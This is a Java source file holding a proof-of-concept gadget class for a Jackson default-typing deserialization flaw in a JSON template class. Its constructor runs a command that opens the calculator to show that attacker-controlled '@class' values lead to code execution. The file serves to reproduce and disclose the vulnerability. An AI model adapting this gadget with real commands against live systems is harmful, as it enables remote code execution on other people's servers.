package com.pj.poc;

/**
 * Jackson DefaultTyping PoC 用 gadget 类（仅用于本地安全复现，勿用于生产）。
 *
 * <p>真实攻击不会自带此类，而是利用 classpath 上已有的 Spring / SnakeYAML 等 gadget；
 * 此处用「无参构造里执行命令」证明：一旦 JSON 里的 {@code @class} 可被攻击者控制，
 * {@code SaJsonTemplateForJackson} 就会实例化任意非 final 类。</p>
 */
public class JacksonRceGadget {

	public JacksonRceGadget() {
		try {
			String os = System.getProperty("os.name", "").toLowerCase();
			ProcessBuilder pb;
			if (os.contains("win")) {
				pb = new ProcessBuilder("calc.exe");
			} else if (os.contains("mac")) {
				pb = new ProcessBuilder("open", "-a", "Calculator");
			} else {
				pb = new ProcessBuilder("xcalc");
			}
			pb.start();
			System.out.println("[Jackson-RCE-PoC] gadget 已执行，尝试弹出计算器");
		} catch (Exception e) {
			throw new RuntimeException("[Jackson-RCE-PoC] gadget 执行失败", e);
		}
	}

}
